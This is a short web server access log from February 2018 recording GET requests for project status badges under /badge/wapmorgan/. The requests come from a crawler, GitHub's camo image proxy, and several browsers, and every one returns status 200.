35.168.2.89 - - [26/Feb/2018:14:25:10 +0000] "GET /badge/wapmorgan/php-rpm-packager HTTP/1.1" 200 1209 "-" "BUbiNG (+http://law.di.unimi.it/BUbiNG.html)"
192.30.252.35 - - [26/Feb/2018:14:56:34 +0000] "GET /badge/wapmorgan/system-daemon HTTP/1.1" 200 1202 "-" "github-camo (65c9ebe0)"
213.55.184.199 - - [26/Feb/2018:14:57:07 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:57.0) Gecko/20100101 Firefox/57.0"
213.55.184.199 - - [26/Feb/2018:14:58:26 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:57.0) Gecko/20100101 Firefox/57.0"
213.55.184.199 - - [26/Feb/2018:14:59:15 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Atom/1.24.0 Chrome/56.0.2924.87 Electron/1.6.16 Safari/537.36"
200.31.169.94 - - [26/Feb/2018:15:02:33 +0000] "GET /badge/wapmorgan/php-code-analyzer HTTP/1.1" 200 1214 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36 OPR/51.0.2830.26"
35.168.2.89 - - [26/Feb/2018:15:02:57 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "-" "BUbiNG (+http://law.di.unimi.it/BUbiNG.html)"
192.30.252.38 - - [26/Feb/2018:15:03:30 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "-" "github-camo (65c9ebe0)"
213.55.184.199 - - [26/Feb/2018:15:03:36 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:57.0) Gecko/20100101 Firefox/57.0"
31.17.91.19 - - [26/Feb/2018:15:07:01 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
213.55.184.199 - - [26/Feb/2018:15:15:54 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:57.0) Gecko/20100101 Firefox/57.0"
35.168.2.89 - - [26/Feb/2018:15:42:35 +0000] "GET /badge/wapmorgan/morphos HTTP/1.1" 200 1184 "-" "BUbiNG (+http://law.di.unimi.it/BUbiNG.html)"
35.168.2.89 - - [26/Feb/2018:16:25:42 +0000] "GET /badge/wapmorgan/file-type-detector HTTP/1.1" 200 1215 "-" "BUbiNG (+http://law.di.unimi.it/BUbiNG.html)"
192.30.252.35 - - [26/Feb/2018:17:07:03 +0000] "GET /badge/wapmorgan/unified-archive HTTP/1.1" 200 1208 "-" "github-camo (65c9ebe0)"
80.251.250.169 - - [26/Feb/2018:17:18:00 +0000] "GET /badge/wapmorgan/mp3info HTTP/1.1" 200 1184 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
192.30.252.36 - - [26/Feb/2018:17:43:40 +0000] "GET /badge/wapmorgan/unified-playlist HTTP/1.1" 200 1209 "-" "github-camo (65c9ebe0)"
